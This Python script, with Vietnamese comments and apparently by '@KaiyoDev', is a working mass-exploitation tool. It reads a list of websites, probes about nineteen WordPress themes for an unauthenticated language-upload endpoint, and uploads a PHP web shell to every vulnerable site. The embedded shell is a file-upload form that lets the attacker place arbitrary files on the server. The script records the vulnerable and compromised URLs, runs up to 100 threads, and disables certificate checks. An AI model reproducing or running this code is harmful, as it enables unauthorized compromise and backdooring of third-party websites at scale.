#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from argparse import ArgumentParser
from random import getrandbits
from concurrent.futures import ThreadPoolExecutor
from threading import Lock
from requests import Session
__import__('warnings').simplefilter('ignore', Warning)
#---------------Mở tool-------------#
class Kaiyoupshell:
#----------Lưu file----------#
    def luu(self, file, data):
        with self.Lock:
            with open(file, 'a') as f:
                f.write(f"{data}\n")#lưu data vào file
#----------Kiểm tra shell--------#
    def xuatshell(self, url):
        name = f"{getrandbits(32)}.php"#get data tối đa 32 kí tự
        r = self.session.post(url, files={"mofile[]": (name, self.shell)}).text
        if "New Language Uploaded Successfully" in r:
            print(f" [ LOG ] (ĐÃ TẢI LÊN SHELL) {url}")
            self.luu("__shells__.txt", url.replace("include/lang_upload.php", f"languages/{name}"))#lưu vào shell
            return 1
        print(f" [ LOG ] (KHÔNG TẢI LÊN SHELL) {url}")
#---------------Scan shell từ tệp-------------#
    def Scanshell(self, url):
        url = f"{'http://' if not url.lower().startswith(('http://', 'https://')) else ''}{url}{'/' if not url.endswith('/') else ''}"#Tách các phân tủ ra
        print(f" [ LOG ] (KIỂM TRA) {url}")
        try:
    #chỗ này chatgpt sửa nên éo biết ok!
            for path in self.paths:
                r = self.session.get(f"{url}wp-content/themes/{path}/include/lang_upload.php").text
                if 'Please select Mo file' in r:
                    #như câu trên hihi!
                    url = f"{url}wp-content/themes/{path}/include/lang_upload.php"
                    print(f" [ LOG ] (DỄ BỊ TẤN CÔNG) {url}")
                    self.luu("__vuln__.txt", url)#lưu shell bị tấn công
                    return self.xuatshell(url)#Trả ngược lại url lưu vào tệp
                print(f" [ LOG ] (KHÔNG DỄ BỊ TẤN CÔNG) {url}")
        except:
            print(f" [ LOG ] LỖI NGOẠI LỆ ({url})")
#---------------------kết thúc mã-------------------#
    def __init__(self, Lock):
        self.Lock = Lock
        self.paths = ["westand", "footysquare", "aidreform", "statfort", "club-theme",
                      "kingclub-theme", "spikes", "spikes-black", "soundblast",
                      "bolster", "rocky-theme", "bolster-theme", "theme-deejay",
                      "snapture", "onelife", "churchlife", "soccer-theme",
                      "faith-theme", "statfort-new"]
        self.shell = '''<?php error_reporting(0);echo("TS<form method='POST' enctype='multipart/form-data'><input type='file'name='f' /><input type='submit' value='up' /></form>");@copy($_FILES['f']['tmp_name'],$_FILES['f']['name']);echo("<a href=".$_FILES['f']['name'].">".$_FILES['f']['name']."</a>");?>'''
        self.session = Session()
        self.session.verify = False
        self.session.timeout = (20, 40)
        self.session.allow_redirects = True
        self.session.max_redirects = 5
        self.session.headers.update({"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"})
#----------------Chúc ae thành công---------------#
if __name__ == '__main__':
    parser = ArgumentParser()
    parser.add_argument('-l', '--list', help="Đường dẫn tới danh sách trang web", required=True)
    parser.add_argument('-t', '--threads', type=int, help="Số lượng luồng", default=100)
    args = parser.parse_args()
    try:
        #đọc tệp chạy luồng máy yếu thì cook
        with open(args.list, 'r') as f: urls = list(set(f.read().splitlines()))
        ExpObj = Kaiyoupshell(Lock())
        with ThreadPoolExecutor(max_workers=int(args.threads)) as pool:
            [pool.submit(ExpObj.Scanshell, url) for url in urls]
    except Exception as e:
        print(e)
        print(" [ LOG ] LỖI NGOẠI LỆ @KaiyoDev")#t.me/kaiyodev
